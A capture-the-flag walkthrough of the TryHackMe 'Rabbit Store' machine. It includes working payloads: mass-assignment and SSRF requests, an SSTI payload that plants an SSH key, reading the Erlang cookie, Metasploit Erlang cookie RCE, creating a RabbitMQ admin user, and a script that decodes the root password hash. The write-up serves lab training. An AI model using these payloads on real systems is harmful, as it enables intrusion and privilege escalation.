# Rabbit Store
Platform: TryHackMe
OS: Linux
Difficulty: Medium
IP: 10.10.X.X

---

## Recon

### Nmap (Service Scan)
- 22/tcp – SSH (OpenSSH 8.9p1 Ubuntu)
- 80/tcp – HTTP (Apache 2.4.52, redirect to cloudsite.thm)
- 4369/tcp – epmd (Erlang Port Mapper Daemon)
- 25672/tcp – RabbitMQ

Notes:
- epmd + RabbitMQ ports indicate Erlang-based message broker backend

---

## Initial Access

### API Abuse – Mass Assignment

POST /api/register
{
  "email": "test@test.com",
  "password": "Password123!",
  "subscription": "active"
}

Finding:
- Client-controlled subscription parameter
- Setting value to active bypasses access control

---

### SSRF – Internal API Documentation

POST /api/store-url
{
  "url": "http://127.0.0.1:3000/api/docs"
}

Finding:
- Backend fetches user-supplied URL
- Access to internal API documentation bound to localhost

```
Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.
```
---

### RCE – SSTI in Chatbot Endpoint

POST /api/fetch_messeges_from_chatbot
{
  "username": "{{request.application.__globals__.__builtins__.__import__('os').popen('echo \"ssh-ed25519 AAAA...\" > /home/azrael/.ssh/authorized_keys').read()}}"
}

Result:
- Server-side template injection confirmed
- OS command execution achieved
- SSH access obtained as user azrael

---

## Privilege Escalation

### RabbitMQ Activity Identification

Finding:
- Erlang and RabbitMQ processes observed via pspy
- Active database at /var/lib/rabbitmq/mnesia/rabbit@forge

Conclusion:
- RabbitMQ is a core backend component
- Erlang-based trust mechanisms likely exploitable

---

### Erlang Cookie Abuse – RabbitMQ Node Authentication

cat /var/lib/rabbitmq/.erlang.cookie

Finding:
- Erlang cookie readable
- Cookie used for Erlang node authentication
- Grants trusted access to RabbitMQ cluster

---

### RabbitMQ RCE via Metasploit (Erlang Cookie)

Metasploit module:
- exploit/multi/misc/erlang_cookie_rce

Metasploit usage:
- RHOST: target IP
- RPORT: 25672
- COOKIE: extracted Erlang cookie

Result:
- Successful authentication to Erlang distribution
- Command execution achieved
- Reverse shell session obtained

---

### Session Obtained as rabbitmq

Result:
- Interactive shell obtained as user `rabbitmq`
- Full access to RabbitMQ filesystem and control utilities

---

### RabbitMQ Administrative Control

rabbitmqctl list_users
```rabbitmqctl list_users
Listing users ...
user    tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256. []
root    [administrator]
```
rabbitmqctl add_user jurgen jurgen
rabbitmqctl set_permissions -p / jurgen ".*" ".*" ".*"
rabbitmqctl set_user_tags jurgen administrator

Result:
- Full administrative control over RabbitMQ obtained
---

### Root Password Disclosure via RabbitMQ

rabbitmqadmin export rabbit.definitions.json -u jurgen -p jurgen
cat rabbit.definitions.json

Finding:
- Exported definitions contain RabbitMQ user credentials
- Password hash for RabbitMQ user root present
- Credentials reused as system root password

---

### Root Password Recovery

import binascii
hash = "<redacted_base64_hash>"
def decode_rabbit_password_hash(password_hash):
    password_hash = binascii.a2b_base64(password_hash)
    decoded_hash = password_hash.hex()
    return decoded_hash[0:8], decoded_hash[8:]
print(decode_rabbit_password_hash(hash))

su root

Result:
- Successful authentication as system root
- Full root access obtained

---

## Kill Chain Summary

- Mass assignment → active subscription
- SSRF → internal API documentation
- SSTI → RCE as azrael
- Erlang cookie disclosure
- Metasploit Erlang Cookie RCE → shell as rabbitmq
- RabbitMQ admin access
- Credential reuse → system root compromise

---

## Takeaways

- Erlang cookie grants full RabbitMQ node trust
- Message brokers are high-impact escalation targets
- Metasploit can be used safely to validate Erlang trust abuse
- Credential reuse between services and OS leads to full compromise
